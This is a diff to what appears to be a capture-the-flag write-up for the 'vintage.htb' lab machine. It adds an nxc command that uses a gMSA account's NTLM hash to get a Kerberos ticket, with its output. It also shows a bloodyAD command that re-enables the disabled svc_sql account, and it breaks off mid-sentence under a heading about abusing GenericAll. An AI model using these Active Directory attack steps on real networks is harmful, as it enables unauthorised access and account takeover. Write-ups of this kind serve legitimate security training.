@@ -201,8 +201,13 @@ The `svc_sql` account is disabled
 
 ## Re-enabling `svc_sql`
 ```python
-
+nxc smb dc01.vintage.htb -u 'GMSA01$' -H '0851299c01b944d01099fc977eaa6c67' --generate-tgt gmsa01 -k
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\GMSA01$:0851299c01b944d01099fc977eaa6c67 
+SMB         dc01.vintage.htb 445    dc01             [+] TGT saved to: gmsa01.ccache
+SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=gmsa01.ccache
 ```
+Im having to regenerate the TGT since i am now in a new group
 
 ```python
 bloodyAD -k --host dc01.vintage.htb -d vintage.htb remove uac 'svc_sql' -f ACCOUNTDISABLE           
@@ -210,4 +215,7 @@ bloodyAD -k --host dc01.vintage.htb -d vintage.htb remove uac 'svc_sql' -f ACCOU
 [-] ['ACCOUNTDISABLE'] property flags removed from svc_sql's userAccountControl
 ```
 To do this i had to re-generate a TGT using nxc since the last one i generated does not contain the new group info 
+
+# Abusing GenericAll on three service accounts
+Now im in the group and have a valid TGT and `svc_sql` is enabled i cah
 
